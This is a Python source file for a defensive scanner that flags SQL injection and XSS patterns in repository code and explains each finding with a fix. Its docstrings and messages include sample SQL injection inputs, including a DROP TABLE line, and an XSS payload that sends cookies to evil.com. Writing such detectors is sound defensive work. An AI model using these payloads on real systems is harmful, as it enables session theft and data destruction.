import re

class SQLXSSScanner:
    """
    Detect SQL Injection and Cross-Site Scripting vulnerabilities.
    
    SQL INJECTION DANGER:
    Attacker enters: " OR "1"="1
    Your code does: SELECT * FROM users WHERE id = " OR "1"="1"
    Result: Returns ALL users instead of one!
    
    Worse case: DROP TABLE users; -- Deletes entire database!
    
    XSS DANGER:
    User enters: <script>alert('hacked')</script>
    Your code displays it raw in HTML
    Attacker's script runs in OTHER users' browsers
    Steal passwords, session tokens, personal data
    """
    
    @classmethod
    def scan(cls, repo_data):
        """Scan for SQL injection and XSS vulnerabilities"""
        vulnerabilities = []
        files = repo_data.get("files", {})
        
        relevant_files = [
            f for f in files.keys() 
            if f.endswith(('.py', '.js', '.ts', '.jsx', '.tsx', '.php', '.java'))
        ]
        
        for file_path in relevant_files:
            content = files[file_path].get("content", "")
            lines = content.split("\n")
            
            for line_num, line in enumerate(lines, 1):
                # Check SQL vulnerabilities
                sql_vuln = cls._check_sql_injection(line, line_num, file_path)
                if sql_vuln:
                    vulnerabilities.append(sql_vuln)
                
                # Check XSS vulnerabilities
                xss_vuln = cls._check_xss(line, line_num, file_path)
                if xss_vuln:
                    vulnerabilities.append(xss_vuln)
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "count": len(vulnerabilities),
            "vulnerabilities": vulnerabilities
        }
    
    @staticmethod
    def _check_sql_injection(line, line_num, file_path):
        """Detect SQL injection vulnerabilities"""
        
        # Pattern 1: String concatenation in SQL
        concat_patterns = [
            r'execute\s*\(\s*["\']SELECT.*?["\']\s*\+',
            r'query\s*=\s*["\']SELECT.*?["\']\s*\+',
            r'\.format\s*\([^)]*?user_input',
            r'db\.query\s*\(\s*f["\']SELECT.*?{.*?}',
        ]
        
        for pattern in concat_patterns:
            if re.search(pattern, line, re.IGNORECASE):
                return {
                    "file": file_path,
                    "line": line_num,
                    "type": "SQL Injection - String Concatenation",
                    "severity": "CRITICAL",
                    "description": "SQL query built by concatenating user input",
                    "code_snippet": line.strip()[:80],
                    "why_dangerous": (
                        "ATTACK EXAMPLE:\n"
                        "Your code: SELECT * FROM users WHERE username = '" + line.strip() + "'\n"
                        "Attacker enters: admin' OR '1'='1\n"
                        "Query becomes: SELECT * FROM users WHERE username = 'admin' OR '1'='1'\n"
                        "Returns: ALL users!\n\n"
                        "Worse: ' DROP TABLE users; --\n"
                        "Deletes database entirely!"
                    ),
                    "fix": (
                        "WRONG:\n"
                        "query = f'SELECT * FROM users WHERE id = {user_id}'\n"
                        "db.execute(query)\n\n"
                        "RIGHT (Parameterized):\n"
                        "db.execute('SELECT * FROM users WHERE id = ?', (user_id,))\n\n"
                        "The ? is a placeholder. Database treats user_id as DATA, "
                        "not as SQL code. Injection impossible!"
                    )
                }
        
        return None
    
    @staticmethod
    def _check_xss(line, line_num, file_path):
        """Detect XSS vulnerabilities"""
        
        xss_patterns = {
            "dangerouslySetInnerHTML": {
                "pattern": r'dangerouslySetInnerHTML\s*=\s*{.*?user',
                "description": "User input in dangerouslySetInnerHTML",
                "context": "React"
            },
            "innerHTML": {
                "pattern": r'innerHTML\s*=\s*.*?(?:user_input|userContent|untrusted)',
                "description": "User input assigned to innerHTML",
                "context": "JavaScript"
            },
            "document.write": {
                "pattern": r'document\.write\s*\(["\'].*?{.*?user',
                "description": "User input in document.write",
                "context": "JavaScript"
            },
            "eval": {
                "pattern": r'eval\s*\(\s*.*?user_input',
                "description": "User input passed to eval",
                "context": "JavaScript/Python"
            },
            "template_unescaped": {
                "pattern": r'{{\s*(?!.*\|escape).*?user_input',
                "description": "Unescaped user input in template",
                "context": "Templates"
            }
        }
        
        for vuln_type, config in xss_patterns.items():
            if re.search(config["pattern"], line, re.IGNORECASE):
                return {
                    "file": file_path,
                    "line": line_num,
                    "type": f"XSS - {vuln_type}",
                    "severity": "HIGH",
                    "description": config["description"],
                    "code_snippet": line.strip()[:80],
                    "why_dangerous": (
                        "ATTACK EXAMPLE:\n"
                        "Attacker comments: <script>fetch('http://evil.com?cookies='+document.cookie)</script>\n"
                        "Your code displays comment without escaping\n"
                        "Script runs in OTHER users' browsers\n"
                        "Attacker steals their session tokens\n"
                        "Can now impersonate them, steal data, change passwords"
                    ),
                    "fix": (
                        "WRONG (React):\n"
                        "<div dangerouslySetInnerHTML={{__html: userComment}} />\n\n"
                        "RIGHT:\n"
                        "<div>{userComment}</div>\n"
                        "React auto-escapes by default. Safe!\n\n"
                        "WRONG (JS):\n"
                        "element.innerHTML = userInput;\n\n"
                        "RIGHT:\n"
                        "element.textContent = userInput; // Sets as text, not HTML\n"
                        "// OR escape HTML entities\n"
                        "const escaped = userInput.replace(/[&<>\"']/g, e => "
                        "({'&':'&amp;','<':'&lt;','>':'&gt;','\"':'&quot;',\"'\":'&#39;'}[e]))"
                    )
                }
        
        return None
